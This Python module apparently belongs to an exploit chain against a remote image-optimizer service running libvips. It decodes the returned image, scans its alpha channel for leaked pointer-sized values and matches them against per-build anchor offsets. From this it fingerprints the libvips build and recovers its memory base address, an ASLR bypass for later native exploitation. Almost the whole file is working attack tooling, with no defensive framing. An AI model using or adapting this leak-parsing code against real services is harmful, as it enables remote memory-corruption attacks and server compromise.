#!/usr/bin/env python3
"""Fail-closed libvips profile classification from returned image pixels."""

from __future__ import annotations

from collections import Counter, defaultdict
import io
from typing import Iterable, Mapping

from PIL import Image, UnidentifiedImageError

from stack_profile import LeakAnchorProfile, NativeStackProfile


MAX_RECORDED_POSITIONS = 8
MAX_PARTIAL_BASES = 3


def _anchor_evidence(
    base: int,
    anchor: LeakAnchorProfile,
    repetitions: Counter[tuple[int, int]],
    positions: dict[tuple[int, int], list[int]],
) -> dict[str, object]:
    key = (base, anchor.offset)
    return {
        "offset": hex(anchor.offset),
        "value": hex(base + anchor.offset),
        "repetitions": repetitions[key],
        "minimum_repetitions": anchor.minimum_repetitions,
        "positions": [hex(position) for position in positions[key]],
    }


def _evaluate_profile(
    alpha: bytes,
    profile: NativeStackProfile,
    observed_hints: Mapping[str, str],
) -> tuple[dict[str, object], list[tuple[int, list[dict[str, object]]]]]:
    leak = profile.libvips.leak
    hint_matches = {
        key: observed_hints.get(key) == value
        for key, value in leak.supporting_hints.items()
        if key in observed_hints
    }
    result: dict[str, object] = {
        "profile_id": profile.profile_id,
        "libvips_version": profile.libvips.version,
        "libvips_build_id": profile.libvips.build_id,
        "scan_start": leak.scan_start,
        "scan_end": leak.scan_end,
        "scan_step": leak.scan_step,
        "required_anchors": leak.required_anchors,
        "declared_anchors": [
            {
                "offset": hex(anchor.offset),
                "minimum_repetitions": anchor.minimum_repetitions,
            }
            for anchor in leak.anchors
        ],
        "supporting_hints": {
            "declared": dict(leak.supporting_hints),
            "observed": dict(observed_hints),
            "matches": hint_matches,
        },
    }
    if leak.scan_end > len(alpha):
        result.update({
            "status": "rejected",
            "reason": "response_too_short",
            "alpha_bytes": len(alpha),
            "pointer_qword_occurrences": 0,
            "distinct_pointer_qwords": 0,
            "supported_bases": [],
            "best_partial_bases": [],
        })
        return result, []

    repetitions: Counter[tuple[int, int]] = Counter()
    positions: dict[tuple[int, int], list[int]] = defaultdict(list)
    pointer_occurrences = 0
    pointer_values: set[int] = set()
    for position in range(leak.scan_start, leak.scan_end - 7, leak.scan_step):
        value = int.from_bytes(alpha[position:position + 8], "little")
        if not leak.pointer_min <= value < leak.pointer_max:
            continue
        pointer_occurrences += 1
        pointer_values.add(value)
        for anchor in leak.anchors:
            base = value - anchor.offset
            if base <= 0 or base & (leak.base_alignment - 1):
                continue
            key = (base, anchor.offset)
            repetitions[key] += 1
            if len(positions[key]) < MAX_RECORDED_POSITIONS:
                positions[key].append(position)

    base_anchors: dict[int, list[LeakAnchorProfile]] = defaultdict(list)
    for base, anchor_offset in repetitions:
        anchor = next(
            item for item in leak.anchors if item.offset == anchor_offset
        )
        if repetitions[(base, anchor_offset)] >= anchor.minimum_repetitions:
            base_anchors[base].append(anchor)

    supported: list[tuple[int, list[dict[str, object]]]] = []
    partial: list[tuple[int, list[LeakAnchorProfile]]] = []
    for base, anchors in base_anchors.items():
        ordered = [anchor for anchor in leak.anchors if anchor in anchors]
        if len(ordered) >= leak.required_anchors:
            supported.append((
                base,
                [
                    _anchor_evidence(base, anchor, repetitions, positions)
                    for anchor in ordered
                ],
            ))
        elif ordered:
            partial.append((base, ordered))
    supported.sort(key=lambda item: item[0])
    partial.sort(
        key=lambda item: (
            -len(item[1]),
            -sum(repetitions[(item[0], anchor.offset)] for anchor in item[1]),
            item[0],
        ),
    )
    result.update({
        "status": (
            "supported" if len(supported) == 1
            else "ambiguous" if supported
            else "rejected"
        ),
        "reason": (
            "exact_anchor_consensus" if len(supported) == 1
            else "multiple_supported_bases" if supported
            else "insufficient_anchor_consensus"
        ),
        "alpha_bytes": len(alpha),
        "pointer_qword_occurrences": pointer_occurrences,
        "distinct_pointer_qwords": len(pointer_values),
        "supported_bases": [
            {"base": hex(base), "anchors": anchors}
            for base, anchors in supported
        ],
        "best_partial_bases": [
            {
                "base": hex(base),
                "anchors": [
                    _anchor_evidence(base, anchor, repetitions, positions)
                    for anchor in anchors
                ],
            }
            for base, anchors in partial[:MAX_PARTIAL_BASES]
        ],
    })
    return result, supported


def classify_libvips_profiles(
    image_bytes: bytes,
    profiles: Iterable[NativeStackProfile],
    observed_hints: Mapping[str, str] | None = None,
) -> dict[str, object]:
    """Return a selection only for one uniquely supported profile/base pair."""
    candidates = sorted(tuple(profiles), key=lambda profile: profile.profile_id)
    if not candidates:
        raise ValueError("at least one classifier profile is required")
    profile_ids = [profile.profile_id for profile in candidates]
    if len(set(profile_ids)) != len(profile_ids):
        raise ValueError("classifier profile IDs must be unique")
    hints = dict(observed_hints or {})
    if not all(
        isinstance(key, str) and key
        and isinstance(value, str) and value
        for key, value in hints.items()
    ):
        raise ValueError("observed hints must be non-empty string pairs")

    try:
        with Image.open(io.BytesIO(image_bytes)) as image:
            rgba = image.convert("RGBA")
            width, height = rgba.size
            alpha = rgba.getchannel("A").tobytes()
    except (OSError, UnidentifiedImageError) as error:
        raise ValueError("optimizer response is not a decodable image") from error

    evaluations = []
    pairs: list[tuple[NativeStackProfile, int, list[dict[str, object]]]] = []
    by_id = {profile.profile_id: profile for profile in candidates}
    for profile in candidates:
        evaluation, supported = _evaluate_profile(alpha, profile, hints)
        evaluations.append(evaluation)
        pairs.extend(
            (profile, base, anchors) for base, anchors in supported
        )

    selected_profile_id = None
    selected_base = None
    selected_anchors: list[dict[str, object]] = []
    status = "no_match"
    if len(pairs) == 1:
        selected_profile, selected_base_value, selected_anchors = pairs[0]
        selected_profile_id = selected_profile.profile_id
        selected_base = hex(selected_base_value)
        status = "selected"
    elif pairs:
        status = "ambiguous"

    return {
        "status": status,
        "selected_profile_id": selected_profile_id,
        "selected_base": selected_base,
        "selected_anchors": selected_anchors,
        "rejected_candidates": [
            profile_id for profile_id in by_id
            if profile_id != selected_profile_id
        ],
        "supported_pair_count": len(pairs),
        "image": {
            "width": width,
            "height": height,
            "alpha_bytes": len(alpha),
        },
        "observed_hints": hints,
        "candidates": evaluations,
    }
